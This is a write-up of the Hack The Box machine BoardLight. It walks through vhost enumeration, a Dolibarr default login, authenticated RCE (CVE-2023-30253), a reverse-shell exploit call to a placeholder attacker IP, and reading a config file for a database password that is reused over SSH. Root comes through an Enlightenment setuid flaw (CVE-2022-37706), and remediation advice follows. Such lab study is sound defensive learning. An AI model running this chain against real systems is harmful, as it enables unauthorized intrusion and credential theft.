---
title: "BoardLight — Dolibarr RCE and Enlightenment SUID Privilege Escalation"
description: "Virtual host enumeration reveals a Dolibarr CRM instance with default credentials; authenticated RCE, credential reuse, and an Enlightenment SUID flaw chain to root."
type: case-study
platform: Hack The Box
content_type: machine
status: published-ready
addedAt: "2026-09-14"
tags:
  - linux
  - web
  - default-credentials
  - privilege-escalation
  - cve
objective: "Escalate from an exposed Dolibarr CRM to root by chaining authenticated RCE, a reused database secret, and a vulnerable setuid helper."
tools:
  - rustscan
  - gobuster
  - sshpass
skill: "Web application exploitation and Linux privilege escalation"
outcome: "Code execution as the web service user and root through the Enlightenment setuid helper (CVE-2022-37706)"
---

## At a glance

| Field | Value |
|---|---|
| Difficulty | Easy |
| Target environment | Linux (Ubuntu 20.04) with Apache 2.4.41 and OpenSSH 8.2p1 |
| Starting position | Unauthenticated network access |
| Objective | Escalate from an exposed Dolibarr CRM to root through authenticated RCE, credential reuse, and a vulnerable setuid helper |
| Outcome | Code execution as the web service user; root via the Enlightenment setuid helper (CVE-2022-37706) |

## Dolibarr default login to SUID root

BoardLight is an Easy-rated Hack The Box Linux machine (Ubuntu 20.04) with a chain of application and credential weaknesses. Virtual-host enumeration against an otherwise unremarkable Apache site exposes Dolibarr 17.0.0 behind a default administrative login; an authenticated remote code execution flaw (CVE-2023-30253) yields a web service shell; database credentials read from the application configuration are reused for a local system account over SSH; and a setuid helper shipped with Enlightenment 0.23.1 (CVE-2022-37706) escalates to root. Target identifiers, credentials, and secret values are replaced with role-based placeholders; command syntax is preserved. See [how evidence is handled](/method/).

**Attack path:** **Unauthenticated enumeration → Dolibarr virtual host → default-credential CRM access → CVE-2023-30253 authenticated RCE → configuration-file database credential → password reuse for SSH → CVE-2022-37706 Enlightenment SUID abuse → root**

## Target, virtual host, and objective

- **Target:** Ubuntu 20.04 host running Apache 2.4.41 (80) and OpenSSH 8.2p1 (22).
- **Starting position:** unauthenticated network access, with no provided credentials.
- **Objective:** move from external enumeration to user and root control by chaining the exposed application, a reused secret, and a local privilege-escalation flaw.
- **Constraints:** all activity stayed inside the Hack The Box lab environment.

## Evidence: virtual host to Enlightenment SUID

### 1. Service Enumeration

Observation: a full TCP scan exposes an SSH service and an HTTP service.

```text
rustscan -a <TARGET_IP> --ulimit 5000 -- -Pn -sC -sV
```

```text
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
```

The site content discloses the domain:

```text
info@<TARGET_VHOST>
```

Significance: the host is a standard Linux web server; with no other application service exposed, HTTP is the primary attack surface, and the leaked address supplies the base domain to enumerate against.

Result: SSH and Apache are reachable and the base domain `<TARGET_VHOST>` is identified.

### 2. Virtual Host Discovery

Observation: the primary site exposes no useful functionality, but the disclosed domain implies additional virtual hosts, so I expected further hosts to be reachable.

```text
gobuster vhost --url http://<TARGET_VHOST> --wordlist <WORDLIST> --append-domain
```

```text
<APPLICATION_VHOST>
```

Significance: the discovered virtual host serves Dolibarr 17.0.0 and expands the attack surface beyond the default site.

Result: a Dolibarr CRM instance is identified at `<APPLICATION_VHOST>`.

### 3. Dolibarr Default Credentials

Observation: the Dolibarr login accepts default administrative credentials.

I tried the shipped default credentials, `<DEFAULT_USER>:<DEFAULT_PASSWORD>`, which the notes report as granting administrative access to the CRM interface.

Significance: administrative access exposes the application's website-builder features, which form the basis of the remote code execution in the next stage.

Result: authenticated CRM access is obtained with default credentials.

### 4. CVE-2023-30253: Authenticated Remote Code Execution

Observation: Dolibarr 17.0.0 is affected by CVE-2023-30253, in which the built-in website editor permits injection of server-side PHP.

Action, shown as a placeholder pattern:

```text
python3 <EXPLOIT_SCRIPT> http://<APPLICATION_VHOST> <DEFAULT_USER> <DEFAULT_PASSWORD> <ATTACKER_IP> <PORT>
```

The exploit returns a shell as the web service user:

```text
<WEB_SERVICE_USER>@<TARGET_HOST>:~$
```

Significance: authenticated remote code execution converts CRM access into code execution in the context of the web server.

Result: a `<WEB_SERVICE_USER>` shell is obtained on the target.

### 5. Credential Discovery and SSH Lateral Movement

Observation: the Dolibarr configuration file is readable from the web service shell and stores the database credentials in plaintext.

```text
cat <APPLICATION_CONFIG_PATH>
```

```php
$dolibarr_main_db_user='<DB_USER>';
$dolibarr_main_db_pass='<DB_PASSWORD>';
```

Listing local home directories confirms the target system account:

```text
ls /home/
```

```text
<LOCAL_USER>
```

The database password is reused for that user, and SSH authentication succeeds:

```text
sshpass -p '<DB_PASSWORD>' ssh <LOCAL_USER>@<TARGET_HOST>
```

```text
<LOCAL_USER>@<TARGET_HOST>:~$
```

Significance: a secret stored for the database crosses into a system account, so a web compromise becomes a stable interactive login.

Result: a `<LOCAL_USER>` SSH shell is obtained, and the database password is validated against the local account.

### 6. CVE-2022-37706: Enlightenment Privilege Escalation

Observation: setuid enumeration reveals several helper binaries shipped with Enlightenment.

```text
python3 suid3num.py
```

```text
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_sys
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_ckpasswd
/usr/lib/x86_64-linux-gnu/enlightenment/utils/enlightenment_backlight
/usr/lib/x86_64-linux-gnu/enlightenment/modules/cpufreq/linux-gnu-x86_64-0.23.1/freqset
```

The installed version falls within the vulnerable range:

```text
dpkg -l | grep enl
```

```text
hi  enlightenment  0.23.1-4  amd64  X11 window manager based on EFL
```

Significance: `enlightenment_sys` is setuid root, and Enlightenment 0.23.1 is affected by CVE-2022-37706, which allows arbitrary command execution through the vulnerable helper.

Action, shown as a placeholder pattern:

```text
./<EXPLOIT_SCRIPT>
```

The resulting execution context is root:

```text
# whoami
root
```

Result: command execution as root is obtained through the Enlightenment setuid helper.

## Two obstacles: a bare site and no credentials

| Challenge | Decision | Rationale |
|---|---|---|
| The primary site exposed no exploitable surface | Enumerated virtual hosts against the disclosed domain | The notes recorded the application virtual host as the entry point |
| No credentials were provided | Used the application's default administrative login | The Dolibarr instance accepted its shipped defaults |

## Outcome: web service user and root via SUID

The documented path reaches code execution as the web service user and root through the Enlightenment setuid helper (CVE-2022-37706). The lab did not test remediation, so the recommendations below remain proposed measures.

## Recommendations: defaults, reused database secret, and SUID helper

1. **Default application credentials.** The Dolibarr instance accepted its shipped administrative login, and that access exposed the CRM and the website-builder feature used for code execution. *Recommendation:* change default credentials before deployment, enforce strong authentication, and restrict management interfaces to trusted networks. *Detection:* flag successful logins to default or privileged accounts, including first-use default-credential patterns.
2. **Plaintext and reused database credentials.** The application configuration stored the database password in cleartext, and the same value authenticated the local `<LOCAL_USER>` account, so an application compromise became a system login. *Recommendation:* keep secrets out of readable configuration files (use environment variables or a secrets manager) and eliminate password reuse between service and human accounts. *Detection:* monitor for successful SSH logins originating from application contexts and for configuration-file reads by web service users.
3. **Vulnerable setuid helper.** A setuid binary bundled with Enlightenment 0.23.1 (CVE-2022-37706) allowed local privilege escalation to root. *Recommendation:* patch or upgrade the window manager, audit setuid binaries, and remove helpers that are not required. *Detection:* baseline setuid binaries on disk and monitor for unexpected additions or version changes.

## References

- [Hack The Box — BoardLight](https://app.hackthebox.com/machines/BoardLight) (retired machine)
- [NVD — CVE-2023-30253](https://nvd.nist.gov/vuln/detail/CVE-2023-30253) (Dolibarr authenticated remote code execution, fixed in 17.0.1)
- [Swascan — Dolibarr 17.0.0 security advisory](https://www.swascan.com/security-advisory-dolibarr-17-0-0/) (vendor advisory for CVE-2023-30253)
- [NVD — CVE-2022-37706](https://nvd.nist.gov/vuln/detail/CVE-2022-37706) (Enlightenment privilege escalation, fixed before 0.25.4)
- [Debian — DSA-5233-1 e17 (CVE-2022-37706)](https://www.debian.org/security/2022/dsa-5233) (distro advisory, fixed version 0.25.4-1)
- [Enlightenment — fix commit for CVE-2022-37706](https://git.enlightenment.org/enlightenment/enlightenment/commit/cc7faeccf77fef8b0ae70e312a21e4cde087e141) (fix commit)
- [RustScan](https://github.com/RustScan/RustScan) (port scanning)
- [Gobuster](https://github.com/OJ/gobuster) (virtual-host discovery)
- [sshpass](https://sourceforge.net/projects/sshpass/) (non-interactive SSH password authentication)
